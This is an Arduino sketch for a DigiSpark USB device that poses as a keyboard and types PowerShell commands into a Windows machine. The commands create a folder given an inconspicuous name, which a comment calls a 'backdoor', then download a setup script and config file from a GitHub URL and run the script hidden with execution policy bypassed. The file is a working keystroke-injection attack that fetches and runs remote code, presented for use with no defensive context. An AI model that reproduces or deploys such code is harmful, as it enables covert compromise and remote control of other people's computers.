#include "DigiKeyboard.h"

#define DK DigiKeyboard
#define LED_PIN 1

const int START_DELAY = 1000; // The amount of time in millis to wait for the computer to identify it as a keyboard.
const int OPEN_DELAY = 1000; // How much time to wait to assure that the powershell is well open.
const char SETUP_FILE_URL[] = "https://raw.githubusercontent.com/daBest222/DigiSpark-PowerShell-Script-and-Code-Launcher/main/Scripts/setup.ps1"; // Where your .ps1 setup file is.
const char CONFIG_FILE_URL[] = "https://raw.githubusercontent.com/daBest222/DigiSpark-PowerShell-Script-and-Code-Launcher/main/Scripts/config.jsonc"; // Where your config.jsonc file is.
const char FOLDER_NAME[] = "$env:LOCALAPPDATA\AppMaintenanceCache"; // Where to create your backdoor. I used the LocalAppData folder with an inconspicuous folder name.

void setup() {
    pinMode(LED_PIN, OUTPUT);
    ledOn();

    wait(START_DELAY);
    ledOff();

    // Open the powershell.

    DK.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    wait(500);

    runCmd("powershell");
    wait(OPEN_DELAY);

    // Setup and run the code.

    ledOn();
    DK.print(F("$folder = \""));
    DK.print(FOLDER_NAME);
    DK.print(F("\""));
    kEnter();

    runCmd(F("New-Item -ItemType Directory -Force -Path $folder"));
    runCmd(F("Set-Location $folder"));

    DK.print(F("Invoke-WebRequest -Uri '"));
    DK.print(SETUP_FILE_URL);
    DK.print(F("' -OutFile 'setup.ps1'"));
    kEnter();

    DK.print(F("Invoke-WebRequest -Uri '"));
    DK.print(CONFIG_FILE_URL);
    DK.print(F("' -OutFile 'config.jsonc'"));
    kEnter();

    runCmd(F("Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File setup.ps1' -WindowStyle Hidden"));
    runCmd(F("exit"));

    // Turn the LED off so you know you can unplug.
    ledOff();
}

void loop() {}

void runCmd(const __FlashStringHelper* cmd) {
    DK.print(cmd);
    kEnter();
}

void kEnter() {
    DK.sendKeyStroke(KEY_ENTER);
}

void wait(int millis) {
    DK.delay(millis);
}

void ledOn() {
    digitalWrite(LED_PIN, HIGH);
}

void ledOff() {
    digitalWrite(LED_PIN, LOW);
}
